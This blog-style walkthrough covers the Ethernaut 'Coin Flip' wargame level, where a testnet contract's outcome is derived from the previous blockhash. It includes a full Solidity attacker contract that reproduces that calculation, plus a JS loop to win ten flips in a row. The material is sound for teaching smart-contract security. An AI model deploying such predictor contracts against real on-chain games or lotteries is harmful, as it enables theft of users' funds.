---
title: "Coin Flip – Level 3 Walkthrough"
summary: "Step-by-step walkthrough for the third Ethernaut wargame level. Learn to exploit pseudo-randomness vulnerabilities, predict coin flips, and automate attacks on deterministic smart contracts."
date: "Jun 25 2025"
tags:
- Ethereum
- Smart Contracts
- Security
- Ethernaut
- Walkthrough
---

 Coin Flip – Level 3 Walkthrough

Welcome to **Coin Flip**, the third level of the **Ethernaut** wargame by [OpenZeppelin](https://ethernaut.openzeppelin.com/), focused on exploiting **pseudo-randomness vulnerabilities**.

---

 Challenge Objective

You are given a contract that mimics a coin flip, generating guesses using a flawed random mechanism:

```solidity
function flip(bool _guess) public returns (bool) { … }
```

Your goals:

- Predict the next coin flip outcome
- Achieve **10 consecutive wins**
- Submit the instance to complete the level

---

 Prerequisites

Before you begin, ensure the following:

- **MetaMask** is installed and connected to a testnet
- **Test ETH** (e.g., Goerli, Sepolia)
- Familiarity with **browser DevTools** and **JS console**
- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)

---

 Getting Started

 1. **Load the Level**

- Visit [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
- Select **"Coin Flip"**
- Click **“Get new instance”**
- Confirm the MetaMask transaction to deploy your unique contract

This injects a global `contract` object into your browser console.

---

 Walkthrough – Step by Step

 Step 1: Understand the Flipping Logic

```js
await contract.flip(true) // or false
await contract.consecutiveWins()
```

Internally, the contract calculates:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1;
```

Since both `blockValue` and `FACTOR` are known, you can **replicate** the result. 
See: [blog.blockmagnates.com][1], [coinsbench.com][2], [dev.to][3], [securitypills.news][4]

---

 Step 2: Create Attack Contract

Craft a Solidity contract that imports `CoinFlip` and predicts each flip:

```solidity
pragma solidity ^0.8.0;
interface ICoinFlip {
 function flip(bool _guess) external returns (bool);
 function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
 ICoinFlip public target;
 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

 constructor(address _target) {
 target = ICoinFlip(_target);
 }

 function attack() external {
 uint256 blockValue = uint256(blockhash(block.number - 1));
 bool guess = (blockValue / FACTOR) == 1;
 target.flip(guess);
 }
}
```

This mimics the contract’s `flip()` logic and calls it with the **correct outcome**. 
Reference: [gist.github.com][5]

---

 Step 3: Deploy & Execute

1. **Deploy** this attack contract via Remix (Injected Provider).
2. **Run** the `attack()` method **10 times**, either manually or in a loop:

 ```js
 for (let i = 0; i < 10; i++) {
 await attacker.attack();
 }
 ```
3. Confirm each flip increases `consecutiveWins`. Eventually, it should hit 10.

---

 Step 4: Submit the Level

Once `consecutiveWins() == 10`, go back to the Ethernaut UI, click **“Submit instance”**, and confirm the transaction.

---

 What You Learn

- Block values like `blockhash` and `block.number` are not secure entropy sources
- You can replicate pseudorandom logic to manipulate outcomes
- Executing calls within your own contract ensures the same block context 
 ([gist.github.com][5], [notonlyowner.com][6])

---

 Concepts Covered

| Concept | Description |
| -------------------------- | --------------------------------------------------------------------------------------- |
| Pseudo-randomness | Demonstrates blockchain vulnerabilities using deterministic data |
| Contract-to-contract calls | Provides simultaneous context for prediction and call |
| Consecutive-state logic | Shows how state resets or increments based on repeated action |
| Attack automation | Highlights how automated scripts/contracts can completely solve deterministic contracts |

---

 Resources

- [Ethernaut Game](https://ethernaut.openzeppelin.com/)

